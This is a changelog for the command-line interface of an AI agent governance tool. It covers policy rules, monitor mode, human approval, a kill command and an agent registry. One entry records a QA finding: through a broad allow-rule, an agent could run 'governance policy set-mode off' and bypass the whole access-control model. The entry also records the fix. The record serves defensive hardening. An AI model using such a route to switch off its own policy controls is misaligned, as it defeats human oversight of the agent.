| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 2026-08-25 | No command changed. The tree was split by subject to get under the project's 700-line limit (T16): `register.governance.ts` 848 → 459 code lines, with the whole `policy` group moving to `register.governance.policy.ts`. Recorded here because the file a reader is pointed at changed, and because the criterion narrowed — the route modules each state one _authorization_ rule, but the policy commands span Viewer to Root by design, so what makes that file coherent is its subject. Verified by `governance --help` and `governance policy --help` listing every subcommand, not only by the type checker.                                                                       |
| 2026-08-24 | Added the `governance agents` command group (M4) — `list`, `register`, `rename`, `set-owner`, `unregister` — the command line's half of the agent registry, and §2c explaining it. The commands live in `src/cli/program/register.governance.agents.ts` rather than in `register.governance.ts`, which was already 163 lines past the project's own limit before M4 (T16); the identity gate both files need moved to `governance-cli-gate.ts`. The registry also changes a command that gained no flags: assigning an agent now refuses one belonging to a different Administrator, while an id that predates the registry is still accepted — the honest limit stated at the end of §2c. |
| 2026-08-24 | Added `governance groups unmigrated` and `governance groups migrate --delete` (M3), and §2b on the group model the CLI now acts inside.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| 2026-08-21 | `agent prompt` gained `--stream`, and Ctrl-C now cancels the agent run rather than only the printout. Also records the three limits that now apply to every prompt on every surface — a five-minute timeout, two concurrent prompts per account and six per installation — and states why there is no `agent cancel` command: the in-flight table is per process, so such a command could only stop a run started in the same terminal, and one that appeared to reach the Gateway's runs would be claiming a power it does not have.                                                                                                                                                      |
| 2026-08-20 | Added `governance deployment` (A7) — Root's deployment and network posture report, on the CLI as well as the dashboard. The CLI form is the one that matters on a new host: the dashboard is reachable only through an SSH tunnel by design, so the moment you most need to know whether the listener is exposed is _before_ that tunnel exists. `--json` for scripts, `--strict` to exit non-zero on a failure; exit 0 by default, because a command that fails on every workstation is one people learn to ignore.                                                                                                                                                                       |
| 2026-08-20 | **Behaviour change, no new flags:** `add-rule` now detects clashes **inside the write lock**. Two administrators adding the same rule at the same instant previously both saw no clash and the loser was told nothing — the duplicate was harmless, the silence was not (QA round 14).                                                                                                                                                                                                                                                                                                                                                                                                     |
| 2026-08-19 | **Behaviour change, no new flags:** a core denial now covers `governance <subcommand>`, so the _agent_ can no longer reach this CLI through a broad operator allow-rule such as `^(node\|npm\|npx\|pnpm) .*$`. Until QA round 13 (finding 73) `openclaw governance policy set-mode off` was a one-command bypass of the entire RBAC model. This stops the agent; it does nothing about a person with shell access, which remains A6 and is why a CLI login is still open work.                                                                                                                                                                                                             |
| 2026-08-19 | `add-rule` gained `--effect allow\|deny` and `--access read\|write`. Both were enforced by the engine since the tier model landed and creatable from no interface, so an operator's own restriction meant hand-editing `policy.json` — the R5 pattern (a mechanism that works, no surface that reaches it). `--access` is **refused** on command and network rules rather than ignored, and the warnings now flip with the rule's direction: a catch-all denial is reported as disabling the agent, not as granting everything.                                                                                                                                                            |
| 2026-08-17 | Added `agent prompt` and `agent transcript` — the User tier's own capability from §1.6 ("may strictly prompt the agents for task execution"), and the last of that tier's capabilities to exist. The run goes through OpenClaw's ordinary ingress, so the policy gate still sees every tool call; a locked-down agent refuses the prompt outright; conversations are kept per (agent, account). CLI prompts carry the existing `cli` attribution caveat.                                                                                                                                                                                                                                   |
| 2026-08-16 | Added `policy set-agent-mode`, the per-agent posture control. Monitor mode had been demoted to a per-agent opt-in when the tier model landed, and nothing on any of the three surfaces could actually set it — the store function was reachable only from tests. The API route, this command, and the dashboard's **Observe one agent** control landed together, all three refusing `off` for the reason documented above. Also records that `add-rule` now distinguishes a clash caused by a deny rule from one caused by an earlier allowance, because the two mean opposite things.                                                                                                     |
| 2026-08-11 | CLI parity closed. Added `policy set-agent-ask`, `policy set-hitl-timeout`, `sessions`, `pending list`, `pending decide`, and an `--agent` option on `add-rule`. `add-rule` now also rejects backtracking-prone patterns and reports conflicts with earlier rules. No known CLI gaps remain against the dashboard.                                                                                                                                                                                                                                                                                                                                                                         |
| 2026-08-10 | First version. Documents `policy show/set-mode/set-ask/add-rule/remove-rule`, `audit tail/verify`, `kill [--release]`. Records that `kill` now measures and prints elapsed time and reports in-flight termination availability honestly, and that `--agent` scoping is dashboard-only so far.                                                                                                                                                                                                                                                                                                                                                                                              |
